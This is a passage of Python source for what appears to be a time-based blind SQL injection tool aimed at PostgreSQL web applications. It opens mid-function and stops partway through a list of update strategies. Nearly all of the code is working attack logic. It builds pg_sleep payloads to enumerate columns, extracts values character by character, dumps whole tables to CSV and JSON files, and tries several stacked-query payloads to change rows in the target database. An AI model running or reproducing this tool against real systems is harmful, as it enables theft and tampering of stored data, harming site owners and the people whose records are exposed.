    is_null, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if is_null:
        if verbose:
            print(f"[+] Value at row {row_index} is NULL")
        return "NULL"
    
    # Get string length first
    length = 0
    for pos in range(1, MAX_CHARS + 1):
        sql_query = f"(CASE WHEN (LENGTH(CAST((SELECT {column_name} FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) AS TEXT)) >= {pos}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_length, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if verbose:
            print(f"Value length >= {pos}: {'Yes' if has_length else 'No'} ({elapsed_time:.2f}s)")
        
        if not has_length:
            length = pos - 1
            break
        length = pos
    
    if verbose:
        print(f"[+] Value at row {row_index} length: {length}")
    
    if length == 0:
        return ""
    
    # Extract characters in parallel
    value = [""] * length
    positions_to_extract = list(range(1, length + 1))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(positions_to_extract), MAX_WORKERS)) as executor:
        future_to_position = {
            executor.submit(
                extract_data_char, 
                request_info, 
                table_name, 
                column_name, 
                row_index, 
                pos, 
                database,
                verbose,
                resume_file
            ): pos for pos in positions_to_extract
        }
        
        for future in concurrent.futures.as_completed(future_to_position):
            position = future_to_position[future]
            try:
                char = future.result()
                if char:
                    value[position - 1] = char
                    
                    if verbose:
                        current = ''.join([c if c else '?' for c in value])
                        print(f"[+] Current value: {current}")
            except Exception as e:
                if verbose:
                    print(f"Error extracting character at position {position}: {e}")
    
    result = ''.join(value)
    print(f"[+] Row {row_index}: {result}")
    return result

def extract_data_char(request_info, table_name, column_name, row_index, position, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Extract a character from a data value using binary search"""
    min_ascii = 32  # Space
    max_ascii = 126  # Tilde
    
    while min_ascii <= max_ascii:
        mid_ascii = (min_ascii + max_ascii) // 2
        
        sql_query = f"(CASE WHEN (ASCII(SUBSTRING(CAST((SELECT {column_name} FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) AS TEXT), {position}, 1)) > {mid_ascii}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        greater_than, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if verbose:
            print(f"Char at position {position} > ASCII {mid_ascii} ({chr(mid_ascii)}): {'Yes' if greater_than else 'No'} ({elapsed_time:.2f}s)")
        
        if greater_than:
            min_ascii = mid_ascii + 1
        else:
            sql_query = f"(CASE WHEN (ASCII(SUBSTRING(CAST((SELECT {column_name} FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) AS TEXT), {position}, 1)) = {mid_ascii}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
            equals, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
            
            if verbose:
                print(f"Char at position {position} = ASCII {mid_ascii} ({chr(mid_ascii)}): {'Yes' if equals else 'No'} ({elapsed_time:.2f}s)")
            
            if equals:
                return chr(mid_ascii)
            max_ascii = mid_ascii - 1
    
    return None

def dump_table_data(request_info, table_name, columns, database='public', limit=None, offset=0, verbose=False, resume_file='psql_extraction.resume'):
    """Dump data from specified columns in a table"""
    global resume_data
    
    print(f"\n🔍 DUMPING TABLE DATA: {database}.{table_name}")
    print("=" * 75)
    
    # Get row count
    row_count = extract_data_count(request_info, table_name, columns[0], database, verbose, resume_file)
    
    if row_count == 0:
        return []
    
    # Apply limit if specified
    if limit is not None and limit > 0:
        effective_count = min(row_count, limit)
    else:
        effective_count = row_count
    
    # Check if we're resuming and have already extracted some rows
    already_extracted_rows = []
    start_offset = offset
    
    if resume_data['table_name'] == table_name and resume_data['database'] == database:
        # Check if we have already extracted data for this table
        if 'extracted_rows' in resume_data and resume_data['extracted_rows']:
            already_extracted_rows = resume_data['extracted_rows']
            start_offset = offset + len(already_extracted_rows)
            print(f"[+] Resuming from row {start_offset} (already extracted {len(already_extracted_rows)} rows)")
        else:
            # Initialize the extracted rows list
            resume_data['extracted_rows'] = []
    else:
        # New extraction, initialize the extracted rows list
        resume_data['extracted_rows'] = []
    
    print(f"[+] Extracting {effective_count} rows from {row_count} total rows")
    print(f"[+] Starting at offset {start_offset}")
    print(f"[+] Columns to extract: {', '.join(columns)}")
    
    # Use previously extracted rows if available
    results = already_extracted_rows.copy()
    
    # Extract remaining rows
    for i in range(start_offset, offset + effective_count):
        row_data = {}
        print(f"\n[*] Extracting row {i+1}/{offset + effective_count}...")
        
        for column in columns:
            value = extract_data_value(request_info, table_name, column, i, database, verbose, resume_file)
            row_data[column] = value
        
        results.append(row_data)
        resume_data['extracted_rows'] = results
        resume_data['extracted_row_count'] = len(results)
        
        # Save progress periodically
        if (i + 1) % 5 == 0 or i == offset + effective_count - 1:
            save_dump_to_file(results, table_name, columns, database)
            save_progress(force=True, resume_file=resume_file)
    
    # Final save
    save_dump_to_file(results, table_name, columns, database, force=True)
    return results

def save_dump_to_file(results, table_name, columns, database, force=False):
    """Save extracted data to files"""
    # Create sanitized filenames
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table_name)
    
    # Save as CSV
    csv_file = f'dump_{safe_db_name}_{safe_table_name}.csv'
    with open(csv_file, 'w') as f:
        # Write header
        f.write(','.join([f'"{col}"' for col in columns]) + '\n')
        
        # Write rows
        for row in results:
            f.write(','.join([f'"{str(row.get(col, "")).replace('"', '""')}"' for col in columns]) + '\n')
    
    # Save as JSON
    json_file = f'dump_{safe_db_name}_{safe_table_name}.json'
    with open(json_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    if force:
        print(f"[+] Data saved to {csv_file} and {json_file}")

def extract_all_columns_parallel(request_info, database, table_name, verbose=False, save_to_file=True, resume_file='psql_extraction.resume', column_threads=5):
    """Extract all column names from a specific table using true parallel extraction"""
    global column_count, resume_data  # Make this global so extract_column_name can access it
    
    # Check if we're resuming and already have columns
    if resume_data['table_name'] == table_name and resume_data['database'] == database and resume_data['column_names']:
        print(f"\n[+] Using {len(resume_data['column_names'])} columns from resume data")
        return resume_data['column_names']
    
    print(f"\n[*] Extracting columns from table '{database}.{table_name}'...")
    
    # Update resume data
    resume_data['table_name'] = table_name
    resume_data['database'] = database
    
    # First check if the table exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='{database}' AND table_name='{table_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Table '{database}.{table_name}' does not exist")
        return []
    
    # Get count of columns
    column_count = 0
    for i in range(1, 100):  # Reasonable limit for columns
        sql_query = f"(CASE WHEN ((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}') >= {i}) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        has_count, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if verbose:
            print(f"Testing if >= {i} columns exist: {'Yes' if has_count else 'No'} ({elapsed_time:.2f}s)")
        
        if not has_count:
            column_count = i - 1
            break
    
    print(f"[+] Found {column_count} columns in table '{table_name}'")
    
    # Initialize list to store column names, with None placeholders
    columns = [None] * column_count
    already_extracted = set()  # To track which columns we've already extracted
    
    # Check if any columns are already in resume data
    if 'column_names' in resume_data and resume_data['column_names']:
        existing_columns = resume_data['column_names']
        print(f"[+] Found {len(existing_columns)} previously extracted columns in resume data")
        # If we have some columns already, track them as already extracted
        # We'll still extract all columns for consistency, but we'll use the cached values
        already_extracted = set(range(min(len(existing_columns), column_count)))
    
    # Use the lower of the requested column_threads, MAX_WORKERS, or column_count
    concurrent_threads = min(column_threads, MAX_WORKERS, column_count)
    print(f"[*] Extracting columns in parallel with {concurrent_threads} threads...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_threads) as executor:
        # Submit all column extractions as concurrent tasks
        future_to_idx = {}
        for idx in range(column_count):
            future = executor.submit(
                extract_column_name, 
                request_info, 
                table_name, 
                idx, 
                database, 
                verbose, 
                resume_file
            )
            future_to_idx[future] = idx
        
        completed_count = 0
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_idx):
            idx = future_to_idx[future]
            try:
                column_name = future.result()
                completed_count += 1
                
                if column_name:
                    columns[idx] = column_name
                    print(f"[+] Progress: {completed_count}/{column_count} columns completed ({int(completed_count/column_count*100)}%)")
                    
                    # Save progress periodically
                    if save_to_file and completed_count % 5 == 0:
                        # Create a copy of columns without None values for saving
                        valid_columns = [col for col in columns if col is not None]
                        save_columns_to_file(valid_columns, column_count, database, table_name, force=False)
                        resume_data['column_names'] = valid_columns
                        save_progress(force=True, resume_file=resume_file)
                        
            except Exception as e:
                print(f"[!] Error extracting column at index {idx}: {e}")
    
    # Remove any None values from columns list (in case some extractions failed)
    columns = [col for col in columns if col is not None]
    
    # Post-processing to verify suspicious column names
    print("[*] Verifying suspicious column names...")
    corrected_columns = []
    for i, column in enumerate(columns):
        if any(c in column for c in "{}|~`!@#$%^&*()+=<>?/\\"):
            print(f"[!] Column '{column}' contains suspicious characters, verifying...")
            # Verify this column name sequentially
            verified_column = extract_column_name(
                request_info, 
                table_name, 
                i, 
                database, 
                verbose, 
                resume_file
            )
            if verified_column and verified_column != column:
                print(f"[!] Corrected column name: '{column}' -> '{verified_column}'")
                corrected_columns.append(verified_column)
            else:
                corrected_columns.append(column)
        else:
            corrected_columns.append(column)
    
    print(f"[+] Successfully extracted {len(corrected_columns)} columns")
    
    # Final save
    if save_to_file and corrected_columns:
        save_columns_to_file(corrected_columns, column_count, database, table_name, force=True)
        resume_data['column_names'] = corrected_columns
        save_progress(force=True, resume_file=resume_file)
    
    return corrected_columns

def save_columns_to_file(columns, total_count, database, table, force=False):
    """Save extracted columns to a file"""
    # Create sanitized filenames
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table)
    
    # Save a readable version of the columns
    with open(f'columns_{safe_db_name}_{safe_table_name}.txt', 'w') as f:
        f.write(f"Columns extracted from {database}.{table} ({len(columns)} of {total_count}):\n")
        f.write("=" * 50 + "\n")
        for i, column in enumerate(columns):
            f.write(f"{i+1}. {column}\n")
    
    # Also save as JSON for easier programmatic access
    with open(f'columns_{safe_db_name}_{safe_table_name}.json', 'w') as f:
        json.dump(columns, f, indent=2)
        
    if force:
        print(f"[+] Columns saved to columns_{safe_db_name}_{safe_table_name}.txt and columns_{safe_db_name}_{safe_table_name}.json")

def dump_column_data(request_info, table_name, column_name, database='public', limit=None, offset=0, verbose=False, resume_file='psql_extraction.resume'):
    """Dump data from a single column in a table"""
    global resume_data
    
    # Check if we're resuming and already have this column
    if (resume_data['table_name'] == table_name and 
        resume_data['database'] == database and 
        column_name in resume_data['extracted_columns']):
        
        values = resume_data['extracted_columns'][column_name]
        print(f"\n[+] Using {len(values)} values for column '{column_name}' from resume data")
        return values
    
    print(f"\n[*] Dumping data from column '{column_name}' in table '{database}.{table_name}'...")
    
    # Get row count if needed
    if resume_data['row_count'] > 0 and resume_data['table_name'] == table_name and resume_data['database'] == database:
        row_count = resume_data['row_count']
        print(f"[+] Using row count from resume data: {row_count}")
    else:
        row_count = extract_data_count(request_info, table_name, column_name, database, verbose, resume_file)
        resume_data['row_count'] = row_count
    
    if row_count == 0:
        print(f"[!] No data found in table '{database}.{table_name}'")
        return []
    
    # Apply limit if specified
    if limit is not None and limit > 0:
        effective_count = min(row_count, limit)
    else:
        effective_count = row_count
    
    print(f"[+] Extracting {effective_count} rows from column '{column_name}'")
    print(f"[+] Starting at offset {offset}")
    
    # Extract data from rows
    values = []
    
    for i in range(offset, offset + effective_count):
        print(f"[*] Extracting row {i+1}/{offset+effective_count} from column '{column_name}'...")
        value = extract_data_value(request_info, table_name, column_name, i, database, verbose, resume_file)
        if value is not None:
            values.append(value)
        
        # Save progress periodically
        if len(values) % 5 == 0 or i == offset + effective_count - 1:
            save_column_data_to_file(values, table_name, column_name, database)
            resume_data['extracted_columns'][column_name] = values
            resume_data['extracted_row_count'] = len(values)
            save_progress(force=False, resume_file=resume_file)
    
    # Final save
    save_column_data_to_file(values, table_name, column_name, database, force=True)
    resume_data['extracted_columns'][column_name] = values
    save_progress(force=True, resume_file=resume_file)
    
    return values

def save_column_data_to_file(values, table_name, column_name, database, force=False):
    """Save extracted column data to a file"""
    # Create sanitized filenames
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table_name)
    safe_column_name = re.sub(r'[^\w\-_]', '_', column_name)
    
    # Save as plain text file
    filename = f'data_{safe_db_name}_{safe_table_name}_{safe_column_name}.txt'
    with open(filename, 'w') as f:
        f.write(f"Data from {database}.{table_name}.{column_name} ({len(values)} rows):\n")
        f.write("=" * 50 + "\n")
        for i, value in enumerate(values):
            f.write(f"{i+1}. {value}\n")
    
    # Also save as JSON
    json_filename = f'data_{safe_db_name}_{safe_table_name}_{safe_column_name}.json'
    with open(json_filename, 'w') as f:
        json.dump(values, f, indent=2)
        
    if force:
        print(f"[+] Data saved to {filename} and {json_filename}")

def dump_table_data_by_columns(request_info, table_name, columns, database='public', limit=None, offset=0, verbose=False, resume_file='psql_extraction.resume'):
    """Dump data from a table one column at a time"""
    global resume_data
    
    # Initialize resume data
    resume_data['table_name'] = table_name
    resume_data['database'] = database
    resume_data['column_names'] = columns
    resume_data['limit'] = limit
    resume_data['offset'] = offset
    
    print(f"\n🔍 DUMPING TABLE DATA BY COLUMNS: {database}.{table_name}")
    print("=" * 75)
    
    # Create a directory to store all column files
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table_name)
    dir_name = f'dump_{safe_db_name}_{safe_table_name}'
    
    try:
        import os
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
    except:
        print(f"[!] Could not create directory {dir_name}, saving to current directory instead")
        dir_name = '.'
    
    # Get row count to have an idea of the total data we'll extract
    if resume_data['row_count'] > 0:
        row_count = resume_data['row_count']
        print(f"[+] Using row count from resume data: {row_count}")
    else:
        row_count = extract_data_count(request_info, table_name, columns[0], database, verbose, resume_file)
        resume_data['row_count'] = row_count
    
    if row_count == 0:
        print(f"[!] No data found in table '{database}.{table_name}'")
        return {}
    
    # Apply limit if specified
    if limit is not None and limit > 0:
        effective_count = min(row_count, limit)
    else:
        effective_count = row_count
    
    print(f"[+] Will extract {effective_count} rows from {len(columns)} columns")
    print(f"[+] Starting at offset {offset}")
    print(f"[+] Columns to extract: {', '.join(columns)}")
    
    # Create a results dictionary to store all data
    if resume_data['extracted_columns']:
        all_data = resume_data['extracted_columns']
        print(f"[+] Resuming with {len(all_data)} columns already extracted")
    else:
        all_data = {column: [] for column in columns}
    
    # Extract each column completely, one by one
    for column_index, column in enumerate(columns):
        # Skip columns we've already extracted
        if column in all_data and len(all_data[column]) >= effective_count:
            print(f"\n[*] Skipping column {column_index+1}/{len(columns)}: '{column}' (already extracted)")
            continue
        
        # Update current column index in resume data
        resume_data['current_column_index'] = column_index
        save_progress(force=True, resume_file=resume_file)
        
        print(f"\n[*] Extracting column {column_index+1}/{len(columns)}: '{column}'")
        
        # Extract all values for this column
        column_values = dump_column_data(
            request_info, 
            table_name, 
            column, 
            database, 
            effective_count, 
            offset, 
            verbose,
            resume_file
        )
        
        all_data[column] = column_values
        
        # Also save the combined data after each column
        save_table_data_to_file(all_data, effective_count, table_name, columns, database)
        resume_data['extracted_columns'] = all_data
        save_progress(force=True, resume_file=resume_file)
    
    # Final save of all data combined
    save_table_data_to_file(all_data, effective_count, table_name, columns, database, force=True)
    save_progress(force=True, resume_file=resume_file)
    
    return all_data

def save_table_data_to_file(column_data, row_count, table_name, columns, database, force=False):
    """Save combined table data to CSV and JSON files"""
    # Create sanitized filenames
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table_name)
    
    # Convert column data to row-based format for CSV
    rows = []
    for i in range(row_count):
        row = {}
        for column in columns:
            if column in column_data and i < len(column_data[column]):
                row[column] = column_data[column][i]
            else:
                row[column] = ""
        rows.append(row)
    
    # Save as CSV
    csv_file = f'dump_{safe_db_name}_{safe_table_name}.csv'
    with open(csv_file, 'w') as f:
        # Write header
        f.write(','.join([f'"{col}"' for col in columns]) + '\n')
        
        # Write rows
        for row in rows:
            f.write(','.join([f'"{str(row.get(col, "")).replace('"', '""')}"' for col in columns]) + '\n')
    
    # Save as JSON (both formats - column-based and row-based)
    json_file = f'dump_{safe_db_name}_{safe_table_name}.json'
    with open(json_file, 'w') as f:
        json.dump({
            "column_data": column_data,
            "row_data": rows
        }, f, indent=2)
    
    if force:
        print(f"[+] Combined data saved to {csv_file} and {json_file}")

def extract_row_by_value(request_info, table_name, column_name, search_value, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Search for a specific value in a column and extract the entire row if found"""
    print(f"\n[*] Searching for '{search_value}' in '{database}.{table_name}.{column_name}'...")
    
    # First check if the table and column exist
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='{column_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Column '{column_name}' does not exist in table '{database}.{table_name}'")
        return None
    
    # Check if the value exists in the table
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} WHERE {column_name}='{search_value}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Value '{search_value}' not found in '{database}.{table_name}.{column_name}'")
        return None
    
    print(f"[+] Found matching value! Extracting the complete row...")
    
    # First, get all columns for this table
    columns = extract_all_columns_parallel(
        request_info, 
        database, 
        table_name, 
        verbose, 
        save_to_file=True, 
        resume_file=resume_file,
        column_threads=5
    )
    
    if not columns:
        print(f"[!] Failed to retrieve columns for table '{database}.{table_name}'")
        return None
    
    print(f"[+] Retrieved {len(columns)} columns to extract for the matching row")
    
    # Now extract the row for each column
    row_data = {}
    
    for i, column in enumerate(columns):
        print(f"[*] Extracting column {i+1}/{len(columns)}: '{column}'...")
        
        # This SQL finds the value in the matched row for each column
        sql_fragment = f"(SELECT {column} FROM {database}.{table_name} WHERE {column_name}='{search_value}' LIMIT 1)"
        value = extract_string_parallel(request_info, sql_fragment, f"Value for {column}", verbose)
        
        row_data[column] = value
    
    # Save the extracted row to a file
    save_row_to_file(row_data, table_name, column_name, search_value, database)
    
    return row_data

def find_row_number(request_info, table_name, column_name, search_value, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Find the row number of a specific value in a column"""
    print(f"\n[*] Finding row number for '{search_value}' in '{database}.{table_name}.{column_name}'...")
    
    # First check if the table and column exist
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='{column_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Column '{column_name}' does not exist in table '{database}.{table_name}'")
        return None
    
    # Check if the value exists in the table
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} WHERE {column_name}='{search_value}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Value '{search_value}' not found in '{database}.{table_name}.{column_name}'")
        return None
        
    # Get total count of rows
    print("[*] Getting total row count...")
    row_count = extract_data_count(request_info, table_name, column_name, database, verbose, resume_file)
    
    if row_count == 0:
        return None
    
    print(f"[*] Table has approximately {row_count} rows, searching for matching row...")
    
    # For large tables, a sequential scan isn't efficient but is thorough
    # For very large tables, we might want to implement a binary search later
    for row_index in range(row_count):
        if row_index % 10 == 0:
            print(f"[*] Checked {row_index} rows so far...")
            
        # This checks if this specific row contains our search value
        sql_query = f"(CASE WHEN ((SELECT {column_name} FROM {database}.{table_name} LIMIT 1 OFFSET {row_index}) = '{search_value}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
        row_matches, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
        
        if row_matches:
            print(f"[+] Found matching value at row number: {row_index+1}")
            return row_index
            
    print(f"[!] Could not determine row number for value '{search_value}'")
    return None

def save_row_to_file(row_data, table_name, search_column, search_value, database):
    """Save the extracted row to files"""
    # Create sanitized filenames
    safe_db_name = re.sub(r'[^\w\-_]', '_', database)
    safe_table_name = re.sub(r'[^\w\-_]', '_', table_name)
    safe_value = re.sub(r'[^\w\-_]', '_', search_value)
    
    # Save as JSON
    json_file = f'row_{safe_db_name}_{safe_table_name}_{safe_value}.json'
    with open(json_file, 'w') as f:
        json.dump(row_data, f, indent=2)
    
    # Save as readable text file
    txt_file = f'row_{safe_db_name}_{safe_table_name}_{safe_value}.txt'
    with open(txt_file, 'w') as f:
        f.write(f"Row from {database}.{table_name} where {search_column}='{search_value}':\n")
        f.write("=" * 60 + "\n\n")
        
        column_width = max(len(col) for col in row_data.keys()) + 2
        
        for column, value in row_data.items():
            f.write(f"{column.ljust(column_width)}: {value}\n")
    
    print(f"[+] Row data saved to {json_file} and {txt_file}")

def update_row_value(request_info, table_name, column_name, search_column, search_value, new_value, database='public', verbose=False, resume_file='psql_extraction.resume'):
    """Update a specific value in a table based on a search condition"""
    print(f"\n[*] Updating '{column_name}' to '{new_value}' in '{database}.{table_name}' where {search_column}='{search_value}'...")
    
    # First check if the table and columns exist
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='{column_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Column '{column_name}' does not exist in table '{database}.{table_name}'")
        return False
    
    # Check if the search column exists
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='{search_column}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Search column '{search_column}' does not exist in table '{database}.{table_name}'")
        return False
    
    # Check if the search value exists in the table
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM {database}.{table_name} WHERE {search_column}='{search_value}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    exists, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    if not exists:
        print(f"[!] Value '{search_value}' not found in '{database}.{table_name}.{search_column}'")
        return False
    
    # Extract existing value for diagnostic purposes
    print(f"[*] Retrieving current value of {column_name} before update...")
    sql_fragment = f"(SELECT {column_name} FROM {database}.{table_name} WHERE {search_column}='{search_value}' LIMIT 1)"
    existing_value = extract_string_parallel(request_info, sql_fragment, f"Current value of {column_name}", verbose)
    print(f"[+] Current value: '{existing_value}'")
    
    # Get data type of the column for proper quoting
    sql_query = f"(CASE WHEN (SELECT data_type FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='{column_name}') = 'integer' THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    is_integer, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    # Handle different data types
    if is_integer and new_value.isdigit():
        quoted_value = new_value  # Don't quote integers
    else:
        # For non-integers, properly escape single quotes
        quoted_value = f"'{new_value.replace('\'', '\'\'')}'"
    
    # Enhanced trigger analysis
    print("[*] Analyzing triggers that might affect this update...")
    sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.triggers WHERE event_object_schema='{database}' AND event_object_table='{table_name}') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    has_triggers, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    
    date_modified_exists = False
    if has_triggers:
        # Extract all triggers on the table
        print("[*] Extracting all triggers on this table...")
        sql_fragment = f"(SELECT string_agg(trigger_name || ' (' || event_manipulation || ')', ', ') FROM information_schema.triggers WHERE event_object_schema='{database}' AND event_object_table='{table_name}')"
        trigger_names = extract_string_parallel(request_info, sql_fragment, "Trigger names", verbose)
        if trigger_names:
            print(f"[+] All triggers on this table: {trigger_names}")
            
            # Check for date_modified specifically 
            if "update_date_modified" in trigger_names:
                print("[!] Found 'update_date_modified' trigger - this automatically updates a timestamp when rows change")
                date_modified_exists = True
                
                # Check if date_modified column exists
                sql_query = f"(CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}' AND column_name='date_modified') THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
                has_date_modified, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
                
                if has_date_modified:
                    print("[+] Found 'date_modified' column - we'll try to work with this in our update strategies")
                
        # Try to get trigger definition for more details
        if verbose and date_modified_exists:
            print("[*] Attempting to extract trigger definition...")
            sql_fragment = f"(SELECT pg_get_triggerdef(oid) FROM pg_trigger WHERE tgname = 'update_date_modified' LIMIT 1)"
            trigger_def = extract_string_parallel(request_info, sql_fragment, "Trigger definition", verbose)
            if trigger_def:
                print(f"[+] Trigger definition: {trigger_def}")
    
    # Perform the update - try multiple strategies
    print(f"\n[*] ATTEMPTING UPDATE STRATEGIES - {column_name} = {quoted_value}")
    print("=" * 75)
    strategies_tried = 0
    update_success = False
    
    # Strategy 1: Standard UPDATE with returning
    print("\n[*] Strategy 1: Standard UPDATE with RETURNING clause...")
    sql_query = f"(CASE WHEN (UPDATE {database}.{table_name} SET {column_name}={quoted_value} WHERE {search_column}='{search_value}' RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 1 SUCCESS! Standard UPDATE appears to have worked")
        update_success = True
    else:
        print("[-] Strategy 1 failed")
    
    # Strategy 2: UPDATE with explicit transaction
    print("\n[*] Strategy 2: UPDATE with explicit transaction...")
    sql_query = f"(SELECT pg_sleep(0); BEGIN; UPDATE {database}.{table_name} SET {column_name}={quoted_value} WHERE {search_column}='{search_value}'; COMMIT; SELECT 1=1) THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 2 SUCCESS! Explicit transaction appears to have worked")
        update_success = True
    
    # Strategy 3: UPDATE with old value check (handles some trigger constraints)
    print("\n[*] Strategy 3: UPDATE with old value check...")
    sql_query = f"(CASE WHEN (UPDATE {database}.{table_name} SET {column_name}={quoted_value} WHERE {search_column}='{search_value}' AND {column_name}='{existing_value}' RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 3 SUCCESS! UPDATE with old value check worked")
        update_success = True
    
    # Strategy 4: Using CTE (Common Table Expression) for Update
    print("\n[*] Strategy 4: Using CTE (Common Table Expression) for update...")
    sql_query = f"(CASE WHEN (WITH rows_to_update AS (SELECT * FROM {database}.{table_name} WHERE {search_column}='{search_value}' LIMIT 1) UPDATE {database}.{table_name} SET {column_name}={quoted_value} FROM rows_to_update WHERE {database}.{table_name}.{search_column}=rows_to_update.{search_column} RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 4 SUCCESS! CTE-based update worked")
        update_success = True
    else:
        print("[-] Strategy 4 failed")
    
    # Strategy 5: Update using a CASE expression
    print("\n[*] Strategy 5: Using CASE expression in UPDATE...")
    sql_query = f"(CASE WHEN (UPDATE {database}.{table_name} SET {column_name}=CASE WHEN {search_column}='{search_value}' THEN {quoted_value} ELSE {column_name} END WHERE {search_column}='{search_value}' RETURNING 1) IS NOT NULL THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 5 SUCCESS! CASE expression update worked")
        update_success = True
    else:
        print("[-] Strategy 5 failed")
    
    # Strategy 6: Using PL/pgSQL anonymous block
    print("\n[*] Strategy 6: Using PL/pgSQL anonymous block...")
    sql_query = f"(SELECT pg_sleep(0); DO $$ BEGIN EXECUTE 'UPDATE {database}.{table_name} SET {column_name}={quoted_value} WHERE {search_column}=''{search_value}'''; END $$; SELECT CASE WHEN 1=1 THEN (SELECT pg_sleep({DELAY})) ELSE pg_sleep(0) END)"
    success, elapsed_time, status_code = run_test_query(request_info, sql_query, resume_file)
    strategies_tried += 1
    
    if success:
        print("[+] Strategy 6 SUCCESS! PL/pgSQL anonymous block worked")
        update_success = True
    else:
        print("[-] Strategy 6 failed")
    
    # Strategy 7: Using savepoints
    print("\n[*] Strategy 7: Using savepoints in transaction...")
